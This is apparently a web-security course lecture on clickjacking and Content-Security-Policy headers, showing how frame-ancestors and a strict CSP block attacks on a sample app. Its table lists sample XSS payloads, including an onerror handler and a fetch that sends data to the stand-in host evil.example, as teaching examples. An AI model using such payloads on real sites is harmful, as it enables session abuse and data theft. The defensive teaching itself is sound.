# Lecture 26.11 · Clickjacking and CSP: A Preview of the Server-Side Fixes (S40)

> **Section:** S26 · **Type:** 📖 Theory · **Track:** ★ Core · **Time:** ~30 minutes
> 🔗 Reference: MDN, "Content Security Policy"; OWASP, "Clickjacking Defense Cheat Sheet"

---

## 1. Clickjacking

An attacker's page loads TaskFlow in an **invisible `<iframe>`** and places a tempting button ("Win a prize!") exactly over TaskFlow's "Delete". The user clicks the prize and deletes a task, with their own session, on the real site.

**Defence:** tell the browser who may frame the page. That's a response **header**, so the server sets it:

```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY                         (the older header, for old browsers)
```

A React app can't protect itself reliably. "Frame-busting" JavaScript (`if (top !== self) top.location = self.location`) can be defeated by sandboxed iframes.

## 2. Content-Security-Policy: a second wall against XSS

CSP tells the browser **where scripts, styles, images and connections may come from**. If XSS still sneaks in, the payload often can't run:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';                 ← no inline <script>, no onerror="…", no eval
  style-src 'self' 'unsafe-inline';  ← styled-components injects <style> (S40 discusses nonces)
  img-src 'self' data:;
  connect-src 'self';                ← fetch/XHR only to our API: exfiltration to evil.example is blocked
  frame-ancestors 'none';            ← clickjacking
  base-uri 'self'; form-action 'self'; object-src 'none'
```

| 26.03's payload | With the CSP above |
|---|---|
| `<img src=x onerror="alert(1)">` | inline handler **blocked** (`script-src 'self'`) |
| `fetch('https://evil.example', …)` | **blocked** (`connect-src 'self'`) |
| `fetch('/api/tasks/1', { method: 'DELETE' })` | allowed: same origin. CSP doesn't replace sanitising. |

## 3. Why it's a preview

CSP and framing are **HTTP response headers**, so they're set by whoever serves the HTML: Vite in development, and **Tomcat** in production (the WAR, S49). S40 adds a `SecurityHeadersFilter`, and has you build the policy in `Content-Security-Policy-Report-Only` mode first, so you see violations without breaking the app.

What the frontend can do now: **stay CSP-compatible**. No inline `<script>`, no `onclick="…"` strings, no `eval` or `new Function`, and no `javascript:` URLs. TaskFlow already follows all of these.

## ✅ Recap

Clickjacking → `frame-ancestors 'none'`. CSP limits what injected code can do and where it can send data. Both are server headers (S40). Keep the frontend free of inline scripts so a strict CSP is possible.
